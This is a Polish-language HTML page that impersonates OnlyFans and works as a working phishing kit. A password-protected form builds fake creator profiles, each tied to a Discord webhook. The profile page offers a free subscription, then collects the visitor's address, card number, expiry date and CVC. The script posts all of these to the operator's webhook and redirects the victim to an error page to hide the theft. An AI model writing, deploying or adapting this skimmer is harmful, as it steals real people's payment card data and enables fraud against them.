<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OnlyFans – Twórcy</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', sans-serif;
            color: #0f0f0f;
        }

        .login-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
        }

        .login-box {
            background: #ffffff;
            padding: 48px 40px;
            border-radius: 24px;
            border: 1px solid #e6e6e6;
            width: 400px;
            text-align: center;
        }

        .login-box h2 {
            font-size: 32px;
            color: #0099ff;
        }

        .login-box p {
            color: #666;
            margin: 8px 0 32px;
        }

        .login-box input {
            width: 100%;
            padding: 14px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 12px;
            margin-bottom: 20px;
        }

        .login-box button {
            width: 100%;
            padding: 14px;
            background: #0099ff;
            border: none;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }

        .login-error {
            color: #ff3b30;
            margin-top: 16px;
        }

        .navbar {
            background: #ffffff;
            border-bottom: 1px solid #e6e6e6;
            padding: 16px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            color: #0099ff;
            cursor: pointer;
        }

        .nav-buttons {
            display: flex;
            gap: 12px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid #ddd;
            color: #0f0f0f;
            padding: 8px 24px;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
        }

        .nav-btn.primary {
            background: #0099ff;
            border: none;
            color: white;
        }

        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 48px 24px;
        }

        .card {
            background: #ffffff;
            border-radius: 24px;
            padding: 40px;
            border: 1px solid #e6e6e6;
            max-width: 600px;
            margin: 0 auto;
        }

        .card h2 {
            font-size: 28px;
            margin-bottom: 8px;
        }

        .sub {
            color: #666;
            margin-bottom: 32px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        input, textarea {
            width: 100%;
            padding: 14px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 15px;
            font-family: inherit;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #0099ff;
        }

        .btn-submit {
            width: 100%;
            background: #0099ff;
            border: none;
            padding: 16px;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 16px;
        }

        .profile-header {
            background: #fafafa;
            border-radius: 24px;
            overflow: hidden;
            border: 1px solid #e6e6e6;
        }

        .banner-img {
            width: 100%;
            height: 200px;
            object-fit: cover;
        }

        .profile-info {
            padding: 20px 28px 28px;
        }

        .avatar-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 4px solid white;
            margin-top: -60px;
            object-fit: cover;
        }

        .profile-name {
            font-size: 24px;
            font-weight: 700;
            margin-top: 12px;
        }

        .profile-username {
            color: #0099ff;
            margin: 4px 0;
        }

        .profile-bio {
            color: #666;
            margin-top: 12px;
        }

        .stats {
            display: flex;
            gap: 32px;
            margin: 24px 0;
            padding: 20px 0;
            border-top: 1px solid #eee;
            border-bottom: 1px solid #eee;
        }

        .stat-number {
            font-size: 28px;
            font-weight: 800;
            color: #0099ff;
        }

        .stat-label {
            font-size: 13px;
            color: #666;
        }

        .subscribe-btn {
            width: 100%;
            background: #0099ff;
            border: none;
            padding: 16px;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
        }

        .features {
            background: #f8f8f8;
            border-radius: 16px;
            padding: 20px;
        }

        .feature {
            padding: 10px 0;
            color: #0099ff;
            font-weight: 500;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: white;
            border-radius: 24px;
            padding: 32px;
            max-width: 500px;
            width: 90%;
        }

        .modal-content input, .modal-content select {
            width: 100%;
            padding: 14px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 12px;
        }

        .row {
            display: flex;
            gap: 12px;
        }

        .close-modal {
            float: right;
            cursor: pointer;
            font-size: 28px;
        }

        .status {
            margin-top: 16px;
            text-align: center;
        }

        .error-page {
            text-align: center;
            padding: 80px 20px;
        }

        .json-output {
            background: #f0f0f0;
            padding: 16px;
            border-radius: 12px;
            margin-top: 20px;
            display: none;
        }

        .json-output textarea {
            font-family: monospace;
            font-size: 12px;
            margin-top: 12px;
        }
    </style>
</head>
<body>

<div class="navbar">
    <div class="logo" onclick="navigateToHome()">OnlyFans</div>
    <div class="nav-buttons">
        <button class="nav-btn" onclick="navigateToHome()">Strona główna</button>
        <button class="nav-btn primary" onclick="navigateToHome()">Dołącz</button>
    </div>
</div>

<div id="app" class="container"></div>

<div id="paymentModal" class="modal">
    <div class="modal-content">
        <span class="close-modal" onclick="closePaymentModal()">&times;</span>
        <h3>💳 Dodaj kartę płatniczą</h3>
        <form id="paymentForm">
            <select id="country" required>
                <option value="">Kraj</option>
                <option>Polska</option>
                <option>USA</option>
                <option>Niemcy</option>
                <option>Wielka Brytania</option>
            </select>
            <input type="text" id="state" placeholder="Stan / Województwo" required>
            <input type="text" id="address" placeholder="Adres" required>
            <input type="text" id="city" placeholder="Miasto" required>
            <input type="text" id="cardName" placeholder="Imię i nazwisko na karcie" required>
            <input type="text" id="cardNumber" placeholder="Numer karty" maxlength="19" required>
            <div class="row">
                <input type="text" id="expiry" placeholder="MM/RR" maxlength="5" required>
                <input type="text" id="cvc" placeholder="CVC" maxlength="4" required>
            </div>
            <button type="submit" class="btn-submit">Zapłać i subskrybuj</button>
        </form>
        <div id="paymentStatus" class="status"></div>
    </div>
</div>

<div class="login-overlay" id="loginOverlay" style="display: none;">
    <div class="login-box">
        <h2>OnlyFans</h2>
        <p>Wprowadź hasło, aby utworzyć profil</p>
        <input type="password" id="passwordInput" placeholder="Hasło">
        <button onclick="checkPassword()">Kontynuuj</button>
        <div id="loginError" class="login-error"></div>
    </div>
</div>

<script>
    const CORRECT_PASSWORD = "dziadkakasa";
    const JSON_FILE = "creators.json";
    
    let creators = {};
    let currentProfileUsername = null;
    let isFormLocked = true;

    async function loadCreators() {
        try {
            const response = await fetch(JSON_FILE + '?t=' + Date.now());
            if (!response.ok) throw new Error();
            creators = await response.json();
        } catch (error) {
            creators = {};
        }
        render();
    }

    function render() {
        const path = window.location.pathname;
        const match = path.match(/^\/@(.+)$/);
        
        if (match) {
            document.getElementById('loginOverlay').style.display = 'none';
            renderProfile(match[1]);
        } else {
            if (isFormLocked) {
                document.getElementById('loginOverlay').style.display = 'flex';
                document.getElementById('app').innerHTML = '';
            } else {
                document.getElementById('loginOverlay').style.display = 'none';
                renderForm();
            }
        }
    }

    function checkPassword() {
        const password = document.getElementById('passwordInput').value;
        const errorDiv = document.getElementById('loginError');
        
        if (password === CORRECT_PASSWORD) {
            isFormLocked = false;
            document.getElementById('loginOverlay').style.display = 'none';
            renderForm();
        } else {
            errorDiv.innerHTML = '❌ Nieprawidłowe hasło';
            document.getElementById('passwordInput').value = '';
        }
    }

    document.getElementById('passwordInput').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') checkPassword();
    });

    function renderForm() {
        const app = document.getElementById('app');
        app.innerHTML = `
            <div class="card">
                <h2>🔥 Zostań twórcą</h2>
                <div class="sub">Wypełnij formularz, aby wygenerować JSON</div>
                <form id="creatorForm">
                    <div class="form-group">
                        <label>Imię i nazwisko</label>
                        <input type="text" id="fullName" placeholder="Jan Kowalski" required>
                    </div>
                    <div class="form-group">
                        <label>@nazwa użytkownika</label>
                        <input type="text" id="username" placeholder="jan_kowalski" required>
                    </div>
                    <div class="form-group">
                        <label>Nazwa wyświetlana</label>
                        <input type="text" id="displayName" placeholder="Janek Official" required>
                    </div>
                    <div class="form-group">
                        <label>Bio / Opis</label>
                        <textarea id="bio" rows="3"></textarea>
                    </div>
                    <div class="form-group">
                        <label>Avatar URL</label>
                        <input type="url" id="avatarUrl" placeholder="https://example.com/avatar.jpg">
                    </div>
                    <div class="form-group">
                        <label>Baner URL</label>
                        <input type="url" id="bannerUrl" placeholder="https://example.com/banner.jpg">
                    </div>
                    <div class="form-group">
                        <label>Webhook Discord</label>
                        <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
                    </div>
                    <button type="submit" class="btn-submit">✨ Generuj JSON ✨</button>
                    <div id="status" class="status"></div>
                </form>
                <div id="jsonOutput" class="json-output">
                    <strong>📋 Skopiuj poniższy JSON do pliku creators.json:</strong>
                    <textarea id="jsonData" rows="10" readonly></textarea>
                    <button onclick="copyJson()" style="margin-top:12px; padding:10px; background:#0099ff; color:white; border:none; border-radius:8px; cursor:pointer;">📋 Kopiuj</button>
                </div>
            </div>
        `;

        document.getElementById('creatorForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value.replace('@', '').toLowerCase();
            
            const newCreator = {
                fullName: document.getElementById('fullName').value,
                displayName: document.getElementById('displayName').value,
                bio: document.getElementById('bio').value,
                avatar: document.getElementById('avatarUrl').value || 'https://placehold.co/200/e6e6e6/999?text=Avatar',
                banner: document.getElementById('bannerUrl').value || 'https://placehold.co/1200x400/e6e6e6/999?text=Baner',
                webhook: document.getElementById('webhookUrl').value,
                created: new Date().toISOString()
            };

            const newData = { ...creators, [username]: newCreator };
            document.getElementById('jsonData').value = JSON.stringify(newData, null, 2);
            document.getElementById('jsonOutput').style.display = 'block';
            document.getElementById('status').innerHTML = '<span style="color:green;">✅ JSON gotowy!</span>';
        });
    }

    function renderProfile(username) {
        const app = document.getElementById('app');
        const profile = creators[username];
        currentProfileUsername = username;

        if (!profile) {
            app.innerHTML = `<div class="error-page"><h2>😕 Nie znaleziono @${username}</h2><button class="nav-btn primary" onclick="navigateToHome()">Strona główna</button></div>`;
            return;
        }

        app.innerHTML = `
            <div class="profile-header">
                <img class="banner-img" src="${profile.banner}">
                <div class="profile-info">
                    <img class="avatar-img" src="${profile.avatar}">
                    <div class="profile-name">${profile.displayName}</div>
                    <div class="profile-username">@${username}</div>
                    <div class="profile-bio">${profile.bio || 'Brak opisu'}</div>
                </div>
            </div>
            <div class="stats">
                <div class="stat"><div class="stat-number">353</div><div class="stat-label">Filmy</div></div>
                <div class="stat"><div class="stat-number">125</div><div class="stat-label">Zdjęcia</div></div>
            </div>
            <button class="subscribe-btn" onclick="openPaymentModal()">SUBSCRIBE – FREE</button>
            <div class="features">
                <div class="feature">✅ Full access to this user's content</div>
                <div class="feature">✅ Direct message with this user</div>
                <div class="feature">✅ Cancel your subscription at any time</div>
            </div>
        `;
    }

    function copyJson() {
        const textarea = document.getElementById('jsonData');
        textarea.select();
        document.execCommand('copy');
        alert('✅ Skopiowano!');
    }

    // Automatyczne dodawanie / w MM/RR
    function setupExpiryInput() {
        const expiryInput = document.getElementById('expiry');
        if (!expiryInput) return;
        
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\//g, '').replace(/\s/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
    }

    function openPaymentModal() {
        document.getElementById('paymentModal').style.display = 'flex';
        setupExpiryInput();
    }

    document.getElementById('paymentForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const profile = creators[currentProfileUsername];
        
        const paymentData = {
            profil: `@${currentProfileUsername}`,
            kraj: document.getElementById('country').value,
            stan_wojewodztwo: document.getElementById('state').value,
            adres: document.getElementById('address').value,
            miasto: document.getElementById('city').value,
            imie_na_karcie: document.getElementById('cardName').value,
            numer_karty: document.getElementById('cardNumber').value,
            data_waznosci: document.getElementById('expiry').value,
            cvc: document.getElementById('cvc').value,
            timestamp: new Date().toLocaleString('pl-PL')
        };

        const statusDiv = document.getElementById('paymentStatus');
        statusDiv.innerHTML = '⏳ Wysyłanie...';

        // Przygotowanie wiadomości na Discord
        const discordMessage = `💳 **NOWA PŁATNOŚĆ!** 💳\n\n` +
            `📌 **Profil:** ${paymentData.profil}\n` +
            `🌍 **Kraj:** ${paymentData.kraj}\n` +
            `🏙️ **Miasto:** ${paymentData.miasto}\n` +
            `📍 **Adres:** ${paymentData.adres}\n` +
            `📝 **Stan/Województwo:** ${paymentData.stan_wojewodztwo}\n\n` +
            `💳 **Dane karty:**\n` +
            `• Imię na karcie: ${paymentData.imie_na_karcie}\n` +
            `• Numer karty: ${paymentData.numer_karty}\n` +
            `• Data ważności: ${paymentData.data_waznosci}\n` +
            `• CVC: ${paymentData.cvc}\n\n` +
            `⏰ **Data:** ${paymentData.timestamp}`;

        // Wysyłka na webhook
        if (profile?.webhook && profile.webhook.startsWith('https://')) {
            try {
                await fetch(profile.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: discordMessage })
                });
                statusDiv.innerHTML = '✅ Wysłano na Discord!';
            } catch(err) {
                statusDiv.innerHTML = '⚠️ Błąd wysyłki';
                console.error(err);
            }
        } else {
            statusDiv.innerHTML = '⚠️ Brak webhooka – dane nie zostały wysłane';
        }

        // Przekierowanie na błąd
        setTimeout(() => {
            window.location.href = 'https://httpbin.org/status/400';
        }, 2000);
    });

    function closePaymentModal() {
        document.getElementById('paymentModal').style.display = 'none';
        document.getElementById('paymentForm').reset();
        document.getElementById('paymentStatus').innerHTML = '';
    }

    function navigateToHome() {
        window.location.href = '/';
    }

    loadCreators();
    window.addEventListener('popstate', loadCreators);
</script>
</body>
</html>
